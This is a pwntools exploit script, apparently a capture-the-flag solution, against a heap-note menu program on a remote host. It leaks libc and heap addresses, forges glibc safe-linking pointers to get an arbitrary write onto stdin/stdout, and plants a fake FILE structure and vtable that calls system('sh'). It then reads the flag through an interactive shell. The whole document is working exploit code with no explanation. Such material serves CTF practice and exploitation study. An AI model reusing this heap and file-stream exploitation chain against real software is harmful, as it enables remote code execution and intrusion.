#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './prob_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '43.203.168.199', 13379

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# load's return
# breakrva 0x215b

# edit's return
# breakrva 0x1974
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
complete_no = 0

def create(idx, title, desc):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b':', title)
    io.sendafter(b':', desc)

def edit(idx, desc):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b'Desc :', desc)

def read(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def complete(idx):
    global complete_no
    no = complete_no
    complete_no += 1
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b':', str(idx).encode())
    log.info("complete %d", no)
    return no

def load(no, idx):
    io.sendlineafter(b'>', b'5')
    io.sendlineafter(b':', str(no).encode())
    io.sendlineafter(b':', str(idx).encode())

def delete(idx):
    io.sendlineafter(b'>', b'6')
    io.sendlineafter(b':', str(idx).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    title = b'0||'+b'A'*(0xf-3)
    create(0, title, cyclic(10) + p64(0x441))
    unsorted_size = complete(0)

    create(1, b'0', b'0')
    create(3, b'0', b'0')
    create(6, b'0', b'0')
    create(7, b'0', b'0')
    for _ in range(40-1):
        create(2, b'0', b'0')

    load(unsorted_size, 0)
    delete(1)
    delete(0)

    create(2, title, cyclic(10))
    read(3)
    io.recvuntil(b'Desc : ')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x203b20
    stdout = libc.sym['_IO_2_1_stdout_']
    stdin = libc.sym['_IO_2_1_stdin_']

    create(4, b'0', b'0')
    create(1, b'0', b'0')
    create(5, b'0', b'0')
    delete(3)

    read(4)
    io.recvuntil(b'Desc : ')
    heap = demangle(u64(io.recv(6).ljust(8, b'\x00'))) - 0x2c0

    # clear bins
    for _ in range(40-1):
        create(2, b'0', b'0')
    create(2, b'asd', b'asd')
    consume_tcache = complete(2)
    load(consume_tcache, 2)
    load(consume_tcache, 2)
    load(consume_tcache, 2)

    # at this point, duplicate ptrs
    # 3 -> 4 (used)
    # 6 -> 1
    # 7 -> 5
    
    create(0, b'asd', b'asd')
    delete(0)
    delete(6)
    edit(1, p64(mangle(heap, stdin+0x30)))

    create(0, b'asd', b'\x00')
    arb_write = complete(0)
    load(arb_write, 0)
    load(arb_write, 0)
    load(arb_write, 0)
    edit(0, flat([
        stdout,
        stdout,
        stdout+0x300,
    ]))

    fp = stdout
    # crafting overlapping IO_FILE, wide_data and wide_vtable
    overlap = b'  sh\x00\x00\x00\x00' # [FILE] _flags | [WIDE DATA] read_ptr
    overlap += flat([
        p64(0x0),               # [WIDE DATA] read_end
        p64(0x0),               # [WIDE DATA] read_base
        p64(0x0),               # [WIDE DATA] write_base
        p64(0x0),               # [WIDE DATA] write_ptr
        p64(0x0),               # [WIDE DATA] write_end
        p64(0x0),               # [WIDE DATA] buf_base
        p64(0x0),               # [WIDE DATA] buf_end 
        p64(0x0),               # [WIDE DATA] save_base
        p64(0x0),               # [WIDE DATA] backup_base 
        p64(0x0),               # [WIDE DATA] save_end
    ])
    overlap += b'\x00' * 8       # [WIDE DATA] state
    overlap += b'\x00' * 8       # [WIDE DATA] last_state

    codecvt = b''
    codecvt += p64(libc.sym['system'])     # [FILE] _chain | [WIDE DATA] codecvt | [VTABLE] __doallocate (at function authenticate, skips the puts because we overwrote stdout)
    codecvt += b'\x00' * 0x18                   # padding
    codecvt += p64(fp - 0x10)                   # [FILE] _lock
    codecvt += p64(0x0) * 2                     # padding
    codecvt += p64(fp+0x8)                      # [FILE] _wide_data
    codecvt += b'\x00' * (0x18 + 4 + 20)        # padding
    codecvt += p64(libc.sym['_IO_wfile_jumps']) # [FILE] vtable
    codecvt += b'\x00' * (0x70 - len(codecvt))  # padding
    
    overlap += codecvt
    overlap += p64(0x0)                         # [WIDE DATA] wchar_t shortbuf[1] (alligned to 8 bytes)
    overlap += p64(fp)                          # [WIDE DATA] vtable

    io.sendline(overlap)
    sleep(1)
    io.sendline(b'cat ../flag')

    log.info("heap: %#x", heap)
    log.info("libc base: %#x", libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
